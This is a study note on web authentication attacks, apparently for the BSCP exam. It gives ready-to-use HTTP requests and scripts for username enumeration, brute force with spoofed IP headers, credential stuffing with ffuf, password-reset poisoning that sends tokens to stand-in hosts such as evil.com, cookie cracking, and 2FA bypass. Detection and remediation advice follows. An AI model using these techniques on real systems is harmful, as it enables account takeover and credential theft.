---
title: Authentication vulnerabilities
slug: authentication-vulnerabilities
aliases: [auth-bypass, login-bypass, brute-force, credential-stuffing, password-reset-poisoning]
---

> **TL;DR:** Authentication is the gatekeeper — username enumeration, brute-force, password-reset poisoning, flawed stay-logged-in cookies, and multi-step auth bypasses are the BSCP bread-and-butter for turning anonymous access into a valid session.

## What it is
Authentication vulnerabilities are flaws in the mechanisms that verify a user's identity. They span the entire login lifecycle: registration (duplicate/overlapping usernames), credential submission (enumeration, brute-force), password reset (token leakage, host header poisoning), session maintenance (weak "remember me" tokens), and multi-factor auth (step-skipping, race conditions). PortSwigger's BSCP exam tests all of these; most appear in Stage 1 where you need a valid session to reach deeper functionality.

## Preconditions / where it applies
- Any web application with a login form, password reset flow, or "stay logged in" feature.
- Rate limiting or account lockout that can be bypassed (IP rotation, header spoofing, parameter manipulation).
- Multi-step authentication where server doesn't re-validate each step.
- Email-based password reset where the Host header is reflected in the reset link.

## Technique

### 1 — Username enumeration

Three observable differences reveal valid usernames:

**Error message difference:**
```http
POST /login
username=invalid&password=test
→ "Invalid username"

username=admin&password=test
→ "Incorrect password"
```

**Response timing:** If the app only hashes the password after confirming the username exists, valid usernames take measurably longer:

```python
# Burp Intruder — use response received timer
# Or Python:
import requests, time
for user in open('users.txt'):
    user = user.strip()
    start = time.time()
    requests.post(URL, data={'username': user, 'password': 'A'*200})
    elapsed = time.time() - start
    if elapsed > 0.5:  # threshold above baseline
        print(f"[VALID] {user} ({elapsed:.2f}s)")
```

Use an extremely long password to amplify the timing difference (forces expensive hash computation only for valid users).

**Response length / status code:** Subtle differences in HTML (extra whitespace, different redirect, cookie set). Burp Intruder's "Grep - Extract" or response length column catches this.

### 2 — Brute-force with rate-limit bypass

**IP rotation via headers:**
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Originating-IP: 192.168.1.1
X-Client-IP: 172.16.0.1
True-Client-IP: 1.2.3.4
```

Rotate the IP on each request. Some apps trust these headers from any source.

**Account lockout reset:** If lockout is per-IP or resets after a successful login, interleave your own valid credential between guesses:

```
admin:password1
myuser:mypass     ← valid creds, resets counter
admin:password2
myuser:mypass
admin:password3
...
```

**Parameter manipulation:**
```json
// Some apps check rate limit only on string username
// Array or JSON list bypass:
{"username": ["admin"], "password": "test"}
{"username": "admin", "password": ["pw1", "pw2", "pw3"]}
```

**Credential stuffing** uses known breach pairs. No lockout defeats this because each account sees only one attempt:

```bash
# Using ffuf with paired wordlists
ffuf -w users.txt:USER -w passwords.txt:PASS -u https://target/login \
  -d 'username=USER&password=PASS' -mode pitchfork \
  -mc 302 -H 'Content-Type: application/x-www-form-urlencoded'
```

### 3 — Password reset poisoning

The app generates a reset link using the Host header:

```http
POST /forgot-password HTTP/1.1
Host: evil-server.attacker.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

The victim receives: `https://evil-server.attacker.com/reset?token=abc123`. When they click it, the attacker's server captures the token.

Variations that bypass Host header validation:

```http
Host: target.com
X-Forwarded-Host: evil.com

Host: target.com:@evil.com

Host: target.com
Host: evil.com
```

**Dangling markup variant:** If the reset email reflects HTML from the request and truncates at a boundary:

```http
Host: target.com:'<a href="//evil.com/?
```

The token ends up in a request to the attacker's server as a query parameter when the email is rendered.

### 4 — Stay-logged-in cookie cracking

Common "remember me" cookie patterns:

```
base64(username:md5(password))
base64(username:timestamp:md5(password+salt))
base64(username:sha1(password))
```

Decode and identify the structure:

```bash
echo 'Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz' | base64 -d
# carlos:26323c16d5f4dabff3bb136f2460a943
```

If the hash is unsalted MD5 of the password, brute-force:

```bash
# Generate candidate cookies
while read pw; do
  hash=$(echo -n "$pw" | md5sum | cut -d' ' -f1)
  cookie=$(echo -n "carlos:$hash" | base64)
  echo "$cookie"
done < passwords.txt > cookies.txt

# Spray with ffuf
ffuf -w cookies.txt -u https://target/my-account \
  -b "stay-logged-in=FUZZ" -mc 200 -fr "Log in"
```

### 5 — Multi-step authentication bypass

Many 2FA implementations verify identity at step 1 (password) but don't re-validate at step 2 (OTP entry). Force-browse past the 2FA page:

```http
# Step 1: Login with valid creds → 302 to /login2
# Skip step 2: directly request the post-auth page
GET /my-account HTTP/1.1
Cookie: session=<session-from-step1>
```

If the server checks for 2FA completion via a flag, look for:

```http
# Submit the 2FA form with the victim's session but navigate to the account page
POST /login2
Cookie: session=<session-from-step1>

mfa-code=0000
→ 302 /my-account  (even if code is wrong, the redirect happens)
```

**Brute-force 2FA codes:** 4-digit OTP = 10,000 combinations. If no rate limit on `/login2`:

```python
# Burp Intruder or Turbo Intruder on the OTP field
# Payload: 0000-9999, zero-padded
# Grep for the authenticated response marker
```

If the session invalidates after N wrong attempts, macro the full flow: login → get new session → try OTP → repeat.

### 6 — Registration / account overlap attacks

Exploit case sensitivity or whitespace handling:

```http
# Register with leading/trailing whitespace
username= admin    (space prefix)
username=admin     (trailing tab/space)

# Register with different case if comparison is case-insensitive
# but storage is case-sensitive
username=Admin
```

After registration, the new account may share access with the existing `admin` account due to inconsistent normalization.

## Detection / blue-team
- Monitor for high-volume login attempts from single IPs or with rotating `X-Forwarded-For`.
- Alert on password reset requests where `Host` differs from the configured domain.
- Log and alert on 2FA bypass patterns: session accessing post-auth pages without completing step 2.
- Detect "stay-logged-in" cookie brute-force: high volume of requests with invalid cookies from one IP.
- Track enumeration: many login failures with distinct usernames from one source.

## Remediation
- Generic error messages: "Invalid username or password" — identical response for both cases.
- Constant-time comparison and constant-time response for login (hash the password regardless of username validity).
- Rate limiting per IP *and* per account, with exponential backoff. CAPTCHA after N failures.
- Password reset links: hard-code the domain; never use the Host header to build URLs. Short-lived tokens (15 min), single-use, invalidate on password change.
- "Remember me" tokens: cryptographically random, stored server-side, not derived from the password. Rotate on each use.
- 2FA: server must enforce completion of all steps; bind the session to the 2FA state machine. Rate-limit OTP attempts and lock out after 3-5 failures.
- Normalize usernames at registration (lowercase, trim whitespace) and enforce uniqueness on the normalized form.

## References
- [PortSwigger — Authentication vulnerabilities](https://portswigger.net/web-security/authentication) — full lab series
- [HackTricks — Login bypass](https://book.hacktricks.wiki/en/pentesting-web/login-bypass/index.html) — technique catalogue
- [OWASP — Testing for Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/) — WSTG chapter 4

See also: [[2fa-bypass]], [[2fa-bypass-deep]], [[session-fixation]], [[session-token-analysis]], [[csrf]], [[host-header-injection]], [[broken-access-control]], [[php-type-juggling]], [[remember-me-flaws]]
